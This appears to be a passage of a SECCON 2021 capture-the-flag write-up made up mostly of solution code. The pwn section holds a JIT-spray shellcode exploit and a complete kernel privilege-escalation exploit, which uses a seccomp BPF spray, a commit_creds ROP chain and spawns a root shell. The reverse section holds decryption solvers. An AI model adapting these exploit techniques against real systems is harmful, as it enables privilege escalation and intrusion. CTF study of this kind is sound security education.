<span class="hljs-attribute">r</span>.interactive()</code></pre><h3 id="pyast64pwn"><a class="header-link" href="#pyast64pwn"></a>pyast64++.pwn</h3>
<p>The fix for argument length is not complete, assigning duplicate args still allows stack OOB</p>
<pre class="hljs"><code>setupJOP()

def setupJOP():
    overwriteRIP(a,a)
    a = <span class="hljs-number">0x04eb5854</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rax</span>
    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x686200c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x686900c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x686e00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x682f00c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x687300c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x686800c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04ebc0fe</span>  #<span class="hljs-keyword">inc</span> <span class="hljs-built_in">al</span><span class="hljs-comment">;</span>
    a = <span class="hljs-number">0x680000c6</span>  #<span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">0x10</span><span class="hljs-comment">;   push ????</span>
    a = <span class="hljs-number">0x04eb905f</span>  #<span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><span class="hljs-comment">;           nop</span>
    a = <span class="hljs-number">0x04eb5f54</span>  #<span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><span class="hljs-comment">;          pop rdi</span>
    a = <span class="hljs-number">0x04ebf631</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span>
    a = <span class="hljs-number">0x04ebd231</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>
    a = <span class="hljs-number">0x04ebc031</span>  #<span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>
    a = <span class="hljs-number">0x050f3bb0</span>  #<span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3b</span><span class="hljs-comment">;      syscall</span>

def overwriteRIP(num1,num1):
    num1+=<span class="hljs-number">0x7</span></code></pre><h3 id="kone_gadget"><a class="header-link" href="#kone_gadget"></a>kone_gadget</h3>
<pre class="hljs"><code><span class="hljs-comment">/*
 * seccomp example with syscall reporting
 *
 * Copyright (c) 2012 The Chromium OS Authors &lt;chromium-os-dev@chromium.org&gt;
 * Authors:
 *  Kees Cook &lt;keescook@chromium.org&gt;
 *  Will Drewry &lt;wad@chromium.org&gt;
 *
 * The code may be used by anyone for any purpose, and can serve as a
 * starting point for developing applications using mode 2 seccomp.
 */</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE 1</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;config.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;seccomp-bpf.h&quot;</span></span>

<span class="hljs-keyword">int</span> pfd[<span class="hljs-number">2</span>],tmp;


<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[0<span class="hljs-title">x800</span>];</span>

<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">install_syscall_filter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;

    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">table</span>[] =</span> {
        <span class="hljs-built_in">BPF_STMT</span>(BPF_LD+BPF_K, <span class="hljs-number">0x01eb9090</span>),
        <span class="hljs-built_in">BPF_STMT</span>(BPF_LD+BPF_K, <span class="hljs-number">0x75cb010f</span>),
        <span class="hljs-built_in">BPF_STMT</span>(BPF_LD+BPF_K, <span class="hljs-number">0x01ebc030</span>),
        <span class="hljs-built_in">BPF_STMT</span>(BPF_LD+BPF_K, <span class="hljs-number">0x61c3c489</span>),
        <span class="hljs-built_in">BPF_STMT</span>(BPF_LD+BPF_K, <span class="hljs-number">0xc3c78948</span>),
        <span class="hljs-built_in">BPF_STMT</span>(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
    };
    <span class="hljs-keyword">for</span>(;i&lt;<span class="hljs-number">0x680</span>;i++)
        filter[i] = table[<span class="hljs-number">0</span>];

    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">1</span>;k&lt;<span class="hljs-number">6</span>;k++)
        filter[i++] = table[k];


    <span class="hljs-comment">/*

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD+BPF_K, 0x01eb9090),
        BPF_STMT(BPF_LD+BPF_K, 0x01eb9090),
        BPF_STMT(BPF_LD+BPF_K, 0x75cb010f),
        BPF_STMT(BPF_LD+BPF_K, 0x01ebc030),
        BPF_STMT(BPF_LD+BPF_K, 0x61c3c489),
        BPF_STMT(BPF_LD+BPF_K, 0xc3c78948),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
    };
    */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> {
        .len =  i,
        .filter = filter,
    };
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++){
        <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">socket</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);
        <span class="hljs-built_in">setsockopt</span>(fd,SOL_SOCKET,<span class="hljs-number">26</span>,&amp;prog,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(prog));
    }


    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

}

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prepare_kernel_cred 0xffffffff81073c60</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> poprdi 0xffffffff81138833</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> commit_creds 0xffffffff81073ad0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mov_rdi_rax x+15</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> swapgs 0xffffffff8161900e</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> iretq 0xffffffff8160257d</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> poprbp 0xffffffff81000599</span>

<span class="hljs-comment">// #0xffffffff8107d6b8: mov rdi, rax; mov eax, dword ptr [rip + 0xdb9267]; leave; cmp rax, rdi; cmovb rax, rdi; ret;</span>
<span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span> </span>{
    __asm__ (
        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
        <span class="hljs-string">&quot;pushf;&quot;</span>
        <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
    );
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] status has been saved.&quot;</span>);
}


<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spawn_shell</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">getuid</span>()) {
        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spwan shell error!&quot;</span>);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span>
</span>{
    <span class="hljs-built_in">save_status</span>();
    <span class="hljs-built_in">signal</span>(SIGSEGV,spawn_shell);
    <span class="hljs-built_in">install_syscall_filter</span>();

    <span class="hljs-keyword">size_t</span> x = <span class="hljs-number">0xffffffffc0015246</span>+<span class="hljs-number">2</span>; 
    <span class="hljs-comment">//scanf(&quot;%lx&quot;,&amp;x);</span>
    <span class="hljs-keyword">unsigned</span> addr = (<span class="hljs-keyword">unsigned</span>)x;
    <span class="hljs-built_in">mmap</span>( (addr&amp;(~<span class="hljs-number">0xfff</span>))<span class="hljs-number">-0x10000</span> ,<span class="hljs-number">0x20000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">34</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">size_t</span> *rop = (addr&amp;(~<span class="hljs-number">0xff</span>));
    <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;

    rop[i++] = poprdi;
    rop[i++] = <span class="hljs-number">0</span>;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = poprbp;
    rop[i++] = &amp;rop[i+<span class="hljs-number">0x8</span>];
    rop[i++] = <span class="hljs-number">0xffffffff8107d6b8</span>UL;
          
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;
    rop[i++] = poprdi+<span class="hljs-number">1</span>;

    rop[i++] = commit_creds;
    rop[i++] = swapgs;
    rop[i++] = iretq;

    rop[i++] = (<span class="hljs-keyword">size_t</span>) spawn_shell; <span class="hljs-comment">// rip</span>

    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    <span class="hljs-built_in">syscall</span>(<span class="hljs-number">1337</span>,x);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre><h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="pyast64rev"><a class="header-link" href="#pyast64rev"></a>pyast64++.rev</h3>
<pre class="hljs"><code>from pwn import *

def encrypt(inp):
    res = inp

    <span class="hljs-symbol">K</span> = b<span class="hljs-string">&#x27;SECCON2021&#x27;</span>
    <span class="hljs-symbol">S</span> = [<span class="hljs-number">0xff</span>-i for i in range(<span class="hljs-number">0x100</span>)]
    j = <span class="hljs-number">0</span>
    for i in range(<span class="hljs-number">0x100</span>):
        j = (j+<span class="hljs-symbol">S</span>[i]+<span class="hljs-symbol">K</span>[i<span class="hljs-comment">%10])&amp;0xff</span>
        <span class="hljs-symbol">S</span>[i],<span class="hljs-symbol">S</span>[j] = <span class="hljs-symbol">S</span>[j],<span class="hljs-symbol">S</span>[i]

    permute = [pow(i,<span class="hljs-number">3</span>,<span class="hljs-number">0x43</span>)&amp;<span class="hljs-number">0x3f</span> for i in range(<span class="hljs-number">0x40</span>)]

    for k in range(<span class="hljs-number">10</span>):
        res = [<span class="hljs-symbol">S</span>[res[i]] for i in range(<span class="hljs-number">0x40</span>)]
        res2 = []
        for i in range(<span class="hljs-number">8</span>):
            v = list(<span class="hljs-string">&#x27;&#x27;</span>.join([bin(res[i*<span class="hljs-number">8</span>+j])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>) for j in range(<span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>])
            for j in range(<span class="hljs-number">0x40</span>):
                v[j], v[permute[j]] = v[permute[j]], v[j]
            v = <span class="hljs-string">&#x27;&#x27;</span>.join(v)
            for j in range(<span class="hljs-number">8</span>):
                res2.append(int(v[j*<span class="hljs-number">8</span>:(j+<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>))
        for i in range(<span class="hljs-number">0x40</span>):
            res2[i]^=<span class="hljs-symbol">K</span>[k]
        res = res2
    return res

def decrypt(res):
    <span class="hljs-symbol">K</span> = b<span class="hljs-string">&#x27;SECCON2021&#x27;</span>
    <span class="hljs-symbol">S</span> = [<span class="hljs-number">0xff</span>-i for i in range(<span class="hljs-number">0x100</span>)]
    j = <span class="hljs-number">0</span>
    for i in range(<span class="hljs-number">0x100</span>):
        j = (j+<span class="hljs-symbol">S</span>[i]+<span class="hljs-symbol">K</span>[i<span class="hljs-comment">%10])&amp;0xff</span>
        <span class="hljs-symbol">S</span>[i],<span class="hljs-symbol">S</span>[j] = <span class="hljs-symbol">S</span>[j],<span class="hljs-symbol">S</span>[i]
    invS = [<span class="hljs-number">0</span> for i in range(<span class="hljs-number">0x100</span>)]
    for i in range(<span class="hljs-number">0x100</span>):
        invS[<span class="hljs-symbol">S</span>[i]] = i

    permute = [pow(i,<span class="hljs-number">3</span>,<span class="hljs-number">0x43</span>)&amp;<span class="hljs-number">0x3f</span> for i in range(<span class="hljs-number">0x40</span>)]

    for k in range(<span class="hljs-number">9</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>):
        res = [res[i]^<span class="hljs-symbol">K</span>[k] for i in range(<span class="hljs-number">0x40</span>)]
        res2 = []
        for i in range(<span class="hljs-number">8</span>):
            v = list(<span class="hljs-string">&#x27;&#x27;</span>.join([bin(res[i*<span class="hljs-number">8</span>+j])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>) for j in range(<span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>])
            for j in range(<span class="hljs-number">0x3f</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>):
                v[j], v[permute[j]] = v[permute[j]], v[j]
            v = <span class="hljs-string">&#x27;&#x27;</span>.join(v)
            for j in range(<span class="hljs-number">8</span>):
                res2.append(invS[int(v[j*<span class="hljs-number">8</span>:(j+<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)])
        res = res2
    return res

target = [<span class="hljs-number">0x4b</span>,<span class="hljs-number">0xcb</span>,<span class="hljs-number">0xbe</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0xa9</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xdb</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0xdf</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xe1</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xee</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0xb0</span>]
print(bytes(decrypt(target)))</code></pre><h3 id="flag"><a class="header-link" href="#flag"></a>&lt;flag&gt;</h3>
<pre class="hljs"><code>import binascii
<span class="hljs-keyword">from</span> pwn import *

K = b&#x27;NekoPunch&#x27;
enc = binascii.unhexlify(&#x27;<span class="hljs-number">6</span>dbf84f73cf6a112268b09525ea550a665e21cb2e3e13af7e3ea0ecb52f5b9cda5b6522b1e978734553f1d7956d4af94bfc3f4d68c8fba9eeecf4035550b9106f70d57d1a6cdaf3211eaaa78d71a9038b71be621241e8b608a43b107f8860f543ab0189aa063800de4bae7d0b11045b8&#x27;)

def ROL8(n,r):
    return ((n<span class="hljs-variable">&lt;&lt;r)|(n&gt;</span>&gt;(<span class="hljs-number">8</span>-r)))&amp;<span class="hljs-number">0</span>xff

def QR(<span class="hljs-keyword">state</span>,a,b,c,d):
    <span class="hljs-keyword">state</span>[b]^=ROL8(((<span class="hljs-keyword">state</span>[a]+<span class="hljs-keyword">state</span>[d])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">1</span>)
    <span class="hljs-keyword">state</span>[c]^=ROL8(((<span class="hljs-keyword">state</span>[b]+<span class="hljs-keyword">state</span>[a])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">2</span>)
    <span class="hljs-keyword">state</span>[d]^=ROL8(((<span class="hljs-keyword">state</span>[c]+<span class="hljs-keyword">state</span>[b])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">3</span>)
    <span class="hljs-keyword">state</span>[a]^=ROL8(((<span class="hljs-keyword">state</span>[d]+<span class="hljs-keyword">state</span>[c])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">4</span>)

def QRinv(<span class="hljs-keyword">state</span>,a,b,c,d):
    <span class="hljs-keyword">state</span>[a]^=ROL8(((<span class="hljs-keyword">state</span>[d]+<span class="hljs-keyword">state</span>[c])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">4</span>)
    <span class="hljs-keyword">state</span>[d]^=ROL8(((<span class="hljs-keyword">state</span>[c]+<span class="hljs-keyword">state</span>[b])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">3</span>)
    <span class="hljs-keyword">state</span>[c]^=ROL8(((<span class="hljs-keyword">state</span>[b]+<span class="hljs-keyword">state</span>[a])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">2</span>)
    <span class="hljs-keyword">state</span>[b]^=ROL8(((<span class="hljs-keyword">state</span>[a]+<span class="hljs-keyword">state</span>[d])&amp;<span class="hljs-number">0</span>xff),<span class="hljs-number">1</span>)

def encrypt(p,K):
    L = len(p)
    c = b&#x27;&#x27;
    <span class="hljs-keyword">state</span> = list(K[:<span class="hljs-number">8</span>])+[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>)]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,L,<span class="hljs-number">8</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
            print(j,i+j)
            <span class="hljs-keyword">state</span>[j+<span class="hljs-number">8</span>] = p[i+j]
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>)
            QR(<span class="hljs-keyword">state</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>)
        c+=bytes(<span class="hljs-keyword">state</span>)
    return c

def decrypt(c,K):
    L = len(c)
    p = b&#x27;&#x27;
    <span class="hljs-keyword">state</span> = list(c[-<span class="hljs-number">8</span>:])+[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>)]
    <span class="hljs-keyword">state</span> = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>)]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,L,<span class="hljs-number">16</span>):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
            <span class="hljs-keyword">state</span>[j] = c[i+j]
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>)
            QRinv(<span class="hljs-keyword">state</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>)
        p+=bytes(<span class="hljs-keyword">state</span>[<span class="hljs-number">8</span>:])
    return p

print(decrypt(enc,K))</code></pre><h3 id="sed-programming"><a class="header-link" href="#sed-programming"></a>sed programming</h3>
<pre class="hljs"><code><span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter


charset = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;I1l&#x27;</span>)

encode = []
decode = []
transition = []

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">escape</span>(<span class="hljs-params">x</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(e <span class="hljs-keyword">if</span> e <span class="hljs-keyword">in</span> charset <span class="hljs-keyword">else</span> <span class="hljs-string">f&#x27;&lt;<span class="hljs-subst">{e}</span>&gt;&#x27;</span> <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> x)

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./checker.sed&#x27;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        <span class="hljs-keyword">if</span> line.strip() == <span class="hljs-string">&#x27;:t&#x27;</span>:
            <span class="hljs-keyword">break</span>

    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        line = line.strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]
        src, dst = <span class="hljs-built_in">map</span>(escape, line.split(<span class="hljs-string">&#x27;/&#x27;</span>))

        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(e <span class="hljs-keyword">in</span> charset <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> src + dst) <span class="hljs-keyword">or</span> src == <span class="hljs-string">&#x27;&lt;^&gt;&#x27;</span>:
            transition.append((src, dst))
        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">any</span>(e <span class="hljs-keyword">in</span> charset <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> src):
            decode.append((src, dst))
        <span class="hljs-keyword">else</span>:
            encode.append((src, dst))

encode = <span class="hljs-built_in">sorted</span>(encode)
decode = <span class="hljs-built_in">sorted</span>(decode)

src_symbols = Counter()
dst_symbols = Counter()


<span class="hljs-keyword">for</span> lst <span class="hljs-keyword">in</span> [encode, decode, transition]:
    <span class="hljs-keyword">for</span> src, dst <span class="hljs-keyword">in</span> lst:
        src_symbols.update(re.findall(<span class="hljs-string">r&#x27;1[^1]*1&#x27;</span>, src))
